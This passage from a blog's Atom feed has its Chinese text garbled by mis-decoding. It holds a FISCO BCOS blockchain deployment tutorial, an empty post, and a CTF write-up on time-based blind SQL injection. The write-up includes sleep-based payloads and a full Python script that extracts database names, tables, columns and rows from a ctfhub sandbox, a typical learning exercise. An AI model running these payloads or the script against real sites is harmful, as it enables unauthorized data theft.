ä¸ºéœ€è¦ç”Ÿæˆåˆ›ä¸–åŒºå—ï¼Œè§„å®šæ­¤æœºæ„å¿…é¡»è¦èŠ‚ç‚¹è¯ä¹¦ã€‚Bæœºæ„é™¤äº†è¦å‘é€P2Pè¿æ¥åœ°å€ä¹‹å¤–è¿˜è¦å‘é€èŠ‚ç‚¹è¯ä¹¦ã€‚" class="headerlink" title="å› ä¸ºéœ€è¦ç”Ÿæˆåˆ›ä¸–åŒºå—ï¼Œè§„å®šæ­¤æœºæ„å¿…é¡»è¦èŠ‚ç‚¹è¯ä¹¦ã€‚Bæœºæ„é™¤äº†è¦å‘é€P2Pè¿æ¥åœ°å€ä¹‹å¤–è¿˜è¦å‘é€èŠ‚ç‚¹è¯ä¹¦ã€‚"></a>å› ä¸ºéœ€è¦ç”Ÿæˆåˆ›ä¸–åŒºå—ï¼Œè§„å®šæ­¤æœºæ„å¿…é¡»è¦èŠ‚ç‚¹è¯ä¹¦ã€‚Bæœºæ„é™¤äº†è¦å‘é€P2Pè¿æ¥åœ°å€ä¹‹å¤–è¿˜è¦å‘é€èŠ‚ç‚¹è¯ä¹¦ã€‚</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp ./agencyB_node_info/cert*.crt ~/generator-A/meta/</span><br><span class="line">cp ./agencyB_node_info/peers.txt ~/generator-A/meta/peersB.txt</span><br></pre></td></tr></table></figure><h3 id="3-7-æœºæ„Aç”Ÿæˆç¾¤ç»„1åˆ›ä¸–åŒºå—"><a href="#3-7-æœºæ„Aç”Ÿæˆç¾¤ç»„1åˆ›ä¸–åŒºå—" class="headerlink" title="3.7 æœºæ„Aç”Ÿæˆç¾¤ç»„1åˆ›ä¸–åŒºå—"></a>3.7 æœºæ„Aç”Ÿæˆç¾¤ç»„1åˆ›ä¸–åŒºå—</h3><h1 id="æ¥ç”Ÿæˆåˆ›ä¸–åŒºå—ã€‚è¿™é‡Œå®é™…å¯ä»¥é€šè¿‡åå•†ç”±é‚£ä¸ªæœºæ„ç”Ÿæˆï¼Œä¸ä¸€å®šæ˜¯Aã€‚"><a href="#æ¥ç”Ÿæˆåˆ›ä¸–åŒºå—ã€‚è¿™é‡Œå®é™…å¯ä»¥é€šè¿‡åå•†ç”±é‚£ä¸ªæœºæ„ç”Ÿæˆï¼Œä¸ä¸€å®šæ˜¯Aã€‚" class="headerlink" title="æ¥ç”Ÿæˆåˆ›ä¸–åŒºå—ã€‚è¿™é‡Œå®é™…å¯ä»¥é€šè¿‡åå•†ç”±é‚£ä¸ªæœºæ„ç”Ÿæˆï¼Œä¸ä¸€å®šæ˜¯Aã€‚"></a>æ¥ç”Ÿæˆåˆ›ä¸–åŒºå—ã€‚è¿™é‡Œå®é™…å¯ä»¥é€šè¿‡åå•†ç”±é‚£ä¸ªæœºæ„ç”Ÿæˆï¼Œä¸ä¸€å®šæ˜¯Aã€‚</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/generator-A</span><br><span class="line">cat &gt; ./conf/group_genesis.ini&lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">[group]</span></span><br><span class="line"><span class="string">group_id=1</span></span><br><span class="line"><span class="string">;i am xiaoyue</span></span><br><span class="line"><span class="string">;my blog-s x1a0.net </span></span><br><span class="line"><span class="string">;yea i love you~</span></span><br><span class="line"><span class="string">[nodes]</span></span><br><span class="line"><span class="string">node0=you_ip:30300</span></span><br><span class="line"><span class="string">node1=you_ip_b:30300</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">./generator --create_group_genesis ./group</span><br></pre></td></tr></table></figure><h1 id="æŠŠgroup1çš„åˆ›ä¸–åŒºå—å‘é€ç»™Bæœºæ„"><a href="#æŠŠgroup1çš„åˆ›ä¸–åŒºå—å‘é€ç»™Bæœºæ„" class="headerlink" title="æŠŠgroup1çš„åˆ›ä¸–åŒºå—å‘é€ç»™Bæœºæ„"></a>æŠŠgroup1çš„åˆ›ä¸–åŒºå—å‘é€ç»™Bæœºæ„</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ./group/group.1.genesis ~/generator-B/meta</span><br></pre></td></tr></table></figure><h2 id="3-8-æœºæ„Aç”Ÿæˆæ‰€å±èŠ‚ç‚¹"><a href="#3-8-æœºæ„Aç”Ÿæˆæ‰€å±èŠ‚ç‚¹" class="headerlink" title="3.8 æœºæ„Aç”Ÿæˆæ‰€å±èŠ‚ç‚¹"></a>3.8 æœºæ„Aç”Ÿæˆæ‰€å±èŠ‚ç‚¹</h2><h1 id="ç”Ÿæˆæœºæ„Açš„èŠ‚ç‚¹"><a href="#ç”Ÿæˆæœºæ„Açš„èŠ‚ç‚¹" class="headerlink" title="ç”Ÿæˆæœºæ„Açš„èŠ‚ç‚¹"></a>ç”Ÿæˆæœºæ„Açš„èŠ‚ç‚¹</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/generator-A</span><br><span class="line">./generator --build_install_package ./meta/peersB.txt ./nodeA</span><br></pre></td></tr></table></figure><h1 id="å¯åŠ¨èŠ‚ç‚¹"><a href="#å¯åŠ¨èŠ‚ç‚¹" class="headerlink" title="å¯åŠ¨èŠ‚ç‚¹"></a>å¯åŠ¨èŠ‚ç‚¹</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash ./nodeA/start_all.sh</span><br></pre></td></tr></table></figure><p>ä¸Šé¢æœ‰ä¸¤ä¸ªéœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼š<br>1.åœ¨ç”Ÿäº§èŠ‚ç‚¹é…ç½®æ–‡ä»¶å’Œåˆ›ä¸–åŒºå—é…ç½®æ–‡ä»¶æ—¶ç«¯å£ä¸€è‡´æ˜¯æ²¡é—®é¢˜çš„ï¼Œå› ä¸ºæˆ‘ä¸åœ¨ä¸€å°æœºå­ä¸Šåšæµ‹è¯•ï¼Œä¸ä¼šå­˜åœ¨ç«¯å£å†²çªçš„æƒ…å†µã€‚ä½†è¿™æ ·åœ¨å¤åˆ¶Bæœºæ„åˆ°Bæœºå­ä¸Šçš„æ—¶å€™è·‘ä¸èµ·æ¥å°±å¾ˆå°´å°¬ã€‚<br>2.rpcçš„ipé»˜è®¤æ˜¯127.0.0.1ï¼Œå¦‚æœç¡¬è¦å¼€å¯çš„è¯ä¼šæŠ¥è­¦å‘Šï¼š<br><img src="https://img-blog.csdnimg.cn/20200721234739617.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¦‚æœéè¦å¼€å¯rpcæµ‹è¯•çš„è¯ï¼Œä¹Ÿå¯ä»¥å‚ç…§ä¸Šé¢è¯´çš„å¼€å¯é˜²ç«å¢™ipç™½åå•ã€‚</p><hr><h2 id="4-Bæœºæ„è½¬ç§»å¹¶ç”ŸæˆèŠ‚ç‚¹"><a href="#4-Bæœºæ„è½¬ç§»å¹¶ç”ŸæˆèŠ‚ç‚¹" class="headerlink" title="4.Bæœºæ„è½¬ç§»å¹¶ç”ŸæˆèŠ‚ç‚¹"></a>4.Bæœºæ„è½¬ç§»å¹¶ç”ŸæˆèŠ‚ç‚¹</h2><p>å‹ç¼©ï¼š<code>tar cvf B.tar generator-B</code><br>è§£å‹ï¼š<code>tar xvf B.tar</code><br>ç„¶åä¸Šä¼ ä¸‹è½½æ“ä½œ</p><h3 id="4-1-ç”Ÿæˆ-amp-å¯åŠ¨èŠ‚ç‚¹ï¼š"><a href="#4-1-ç”Ÿæˆ-amp-å¯åŠ¨èŠ‚ç‚¹ï¼š" class="headerlink" title="4.1 ç”Ÿæˆ&amp;å¯åŠ¨èŠ‚ç‚¹ï¼š"></a>4.1 ç”Ÿæˆ&amp;å¯åŠ¨èŠ‚ç‚¹ï¼š</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./generator --build_install_package ./meta/peersA.txt ./nodeB</span><br><span class="line">Copy to clipboard</span><br></pre></td></tr></table></figure><p>æœºæ„Bå¯åŠ¨èŠ‚ç‚¹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash ./nodeB/start_all.sh</span><br></pre></td></tr></table></figure><hr><h3 id="Z-æŸ¥çœ‹å…±è¯†çŠ¶æ€"><a href="#Z-æŸ¥çœ‹å…±è¯†çŠ¶æ€" class="headerlink" title="Z.æŸ¥çœ‹å…±è¯†çŠ¶æ€"></a>Z.æŸ¥çœ‹å…±è¯†çŠ¶æ€</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -f ./node*/node*/<span class="built_in">log</span>/<span class="built_in">log</span>*  | grep +++</span><br></pre></td></tr></table></figure><p>æ­£ç¡®å›æ˜¾å¦‚ä¸‹ï¼š<br><img src="https://img-blog.csdnimg.cn/20200721235803290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW95dWUyMDE5,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ã€‚å°±æ˜¯ä¸Šé¢è¯´çš„å¯¹è‡ªå·±è‡ªä¿¡ä¸è¿›è¡Œæµ‹è¯•ï¼Œå¯¼è‡´ipè¾“é”™äº†å¯¼è‡´å…±è¯†å¤±è´¥ï¼Œè¿™æ—¶å€™æ˜¯æ²¡æœ‰å›æ˜¾çš„ã€‚æŠŠåé¢çš„æ­£åˆ™åˆ æ‰å°±è¡Œäº†ã€‚èƒ½çœ‹åˆ°æ—¥å¿—æŠ¥é”™ï¼Œé€šè¿‡æŠ¥é”™å»æ‰¾ä¸èƒ½å…±è¯†çš„åŸå› ã€‚</p><hr><p><del>å¹¿å‘Šå¢™</del> ï¼š<br><img src="https://img-blog.csdnimg.cn/2020072200040719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW95dWUyMDE5,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><blockquote><p><em>å‚è€ƒï¼š<a href="https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/enterprise_tools/tutorial_detail_operation.html">https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/enterprise_tools/tutorial_detail_operation.html</a></em></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä»Šå¤©å‡Œæ™¨äº¤çš„POCï¼Œç°åœ¨å¤ç°å®Œç»„ç½‘è¿‡ç¨‹å°±å¯ä»¥ç¢è§‰äº†ï¼Œemm~&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;0-éœ€æ±‚åˆ†æ&quot;&gt;&lt;a href=&quot;#0-éœ€æ±‚åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;0.éœ€æ±‚åˆ†æ&quot;&gt;&lt;/a&gt;0.éœ€æ±‚åˆ†æ&lt;/h2&gt;&lt;p&gt;æœ‰ä¸¤å°æœåŠ¡å™¨ï¼Œç‹—å­å“¥è¯´</summary>
      
    
    
    
    <category term="åŒºå—é“¾" scheme="https://x1a0.net/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
  </entry>
  
  <entry>
    <title>ENSä½¿ç”¨æŒ‡å—ï¼ˆéšè—æ–‡ç« ï¼‰</title>
    <link href="https://x1a0.net/2020/07/12/185/"/>
    <id>https://x1a0.net/2020/07/12/185/</id>
    <published>2020-07-11T16:00:18.000Z</published>
    <updated>2020-07-11T16:00:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>pass</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;pass&lt;/p&gt;
</summary>
      
    
    
    
    <category term="æ‚é¡¹" scheme="https://x1a0.net/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
  </entry>
  
  <entry>
    <title>æŠ€èƒ½æ ‘æ­å»ºä¹‹time-based blind+è„šæœ¬</title>
    <link href="https://x1a0.net/2020/05/23/171/"/>
    <id>https://x1a0.net/2020/05/23/171/</id>
    <published>2020-05-22T16:53:55.000Z</published>
    <updated>2020-05-22T16:53:55.000Z</updated>
    
    <content type="html"><![CDATA[<p>æ—¶é—´ç›²æ³¨å’Œå¸ƒå°”ç›²æ³¨æœ‰å¼‚æ›²åŒå·¥ä¹‹å¦™ã€‚<br>â€œ1 and ascii(substr(database(),{},{}))={} %23â€<br>â€œ1 and if(ascii(substring(database(),{},1))={},sleep(3),1) â€“+â€<br>è¯´æ˜¯å¼‚æ›²åŒå·¥ï¼Œä¸å¦‚è¯´æ˜¯ä¸€æ¨¡ä¸€æ ·..<br>å¤šäº†ä¸ªifåˆ¤æ–­ï¼Œæ­£ç¡®sleepï¼Œé”™è¯¯è¿”å›1</p><p>å¦‚æ­¤ï¼Œï¼ˆä¾¿ä¸èƒ½æˆä¸ºä½ ä¸é‡å†™è„šæœ¬çš„åŸå› ï¼‰</p><p><img src="https://oss.x1a0.net/image/2020/05/23/662842698998130/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200523004857.png" alt="å¾®ä¿¡æˆªå›¾_20200523004857.png"></p><hr><p>æœ‰æç¤ºï¼Œæ•°å­—å‹æ³¨å…¥ã€‚</p><p>ç¿»æ‰¾äº†ä¹‹å‰çš„blindè„šæœ¬ï¼Œä¿®æ”¹ä¸‹ï¼š</p><pre><code>import requests,timeurl=&#39;http://challenge-b809a1815ce6a2f0.sandbox.ctfhub.com:10080/?id=&#123;&#125;&#39;# ---------è®¾ç½®payloadï¼ˆé»˜è®¤æ•°å­—å‹æ³¨å…¥ï¼‰---------Get_db_payload=&quot;1 and if(ascii(substring(database(),&#123;&#125;,1))=&#123;&#125;,sleep(3),1) --+&quot;Get_table_payload=&quot;1 and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit &#123;&#125;,&#123;&#125;),&#123;&#125;,1))=&#123;&#125;,sleep(3),1) --+&quot;Get_columns_payload=&quot;1 and if(ascii(substring((select column_name from information_schema.columns where table_schema=database() and table_name=&#39;&#123;&#125;&#39; limit &#123;&#125;,&#123;&#125;),&#123;&#125;,1))=&#123;&#125;,sleep(3),1) --+&quot;Get_dump_payload=&quot;1 and if(ascii(substring((select &#123;&#125; from &#123;&#125; limit &#123;&#125;,&#123;&#125;),&#123;&#125;,1))=&#123;&#125;,sleep(3),1) --+&quot;# ----------------------------------------------# ---------è®¾ç½®è¿”å›æ­£ç¡®é¡µé¢æç¤ºï¼Œå’Œheader--------if_data=&#39;query_success&#39;key=[&#39;&#123;&#39;,&#39;&#125;&#39;, &#39;@&#39;, &#39;_&#39;,&#39;,&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;j&#39;,&#39;h&#39;,&#39;i&#39;,&#39;g&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;G&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;]headers=&#123;&#125;# ----------------------------------------------def Get_db():    db_text,num,_=&#39;&#39;,1,&quot;&quot;    while 1:        for i in key:            _=db_text   # tempå˜é‡ç›¸å½“äºè®°å½•ä¸Šä¸€è½®çš„å€¼ï¼Œå¦‚æœåˆ¤æ–­å’Œè¿™è½®ç›¸ç­‰ï¼Œé‚£ä¹ˆå°±returnï¼Œè¿™æ ·å°±ä¸ç”¨è·å–æ•°æ®åº“é•¿åº¦äº†ã€‚            payload=Get_db_payload.format(num,ord(i))            start_time=time.time()            requests.get(url.format(payload))            stop_time=time.time()            if stop_time-start_time&gt;2:                db_text+=i                num+=1                break        if db_text==_:            return db_text        print(&#39;[+]out:&#39;+db_text)def Get_table():    tables=[]    for num_biao in range(1,9999999):        tables.append(&#39;&#39;)        last=&#39;&#39;        for ranking_biao in range(1,99999999):            for i in key:                last=tables[num_biao-1]                payload=Get_table_payload.format(num_biao-1,num_biao,ranking_biao,ord(i))                start_time=time.time()                requests.get(url.format(payload))                stop_time=time.time()                if stop_time-start_time&gt;2:                    tables[num_biao-1]+=i                    break            if last==tables[num_biao-1]:                break        if tables[num_biao-1]==&#39;&#39;:            tables.pop()            return tables        print(&#39;[+]out:&#39;+tables[num_biao-1])def Get_columns(table):    columns=[]    for columns_num in range(1,999999):        columns.append(&#39;&#39;)        last=&#39;&#39;        for columns_ranking in range(1,999999):            for i in key:                last=columns[columns_num-1]                payload=Get_columns_payload.format(table,columns_num-1,1,columns_ranking,ord(i))                st=time.time()                requests.get(url.format(payload))                stt=time.time()                if stt-st&gt;2:                    columns[columns_num-1]+=i                    break            if last==columns[columns_num-1]:                break        print(columns)        if columns[columns_num-1]==&#39;&#39;:            columns.pop()            return columns        print(&#39;[+]out:&#39;+columns[columns_num-1])def Get_dump(column,table):    data=[]    for i in range(1,999999):        data.append(&#39;&#39;)        temp=&#39;&#39;        for j in range(1,999999):            for k in key:                temp=data[i-1]                payload=Get_dump_payload.format(column,table,i-1,1,j,ord(k))                s=time.time()                requests.get(url.format(payload))                t=time.time()                if t-s&gt;2:                    data[i-1]+=k                    break            if temp==data[i-1]:                break            print(data[i-1])        if data[i-1]==&#39;&#39;:            data.pop()            return data        print(&quot;[+]out:&quot;+data[i-1])if __name__ == &quot;__main__&quot;:    Get_dump(&#39;flag&#39;,&#39;flag&#39;)</code></pre><p><img src="https://oss.x1a0.net/image/2020/05/23/664002387726255/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200523005313.png" alt="å¾®ä¿¡æˆªå›¾_20200523005313.png"></p><hr><p>wo~~ </p><p>æˆ‘è‡ªæ¨ªåˆ€å‘å¤©ç¬‘ï¼Œ<br>å»ç•™è‚èƒ†ä¸¤æ˜†ä»‘ï¼</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æ—¶é—´ç›²æ³¨å’Œå¸ƒå°”ç›²æ³¨æœ‰å¼‚æ›²åŒå·¥ä¹‹å¦™ã€‚&lt;br&gt;â€œ1 and ascii(substr(database(),{},{}))={} %23â€&lt;br&gt;â€œ1 and if(ascii(substring(database(),{},1))={},sleep(3),1) â€“+â€&lt;br&gt;</summary>
      
    
    
    
    <category term="CTF" scheme="https://x1a0.net/categories/CTF/"/>
    
    
  </entry>
  
</feed>
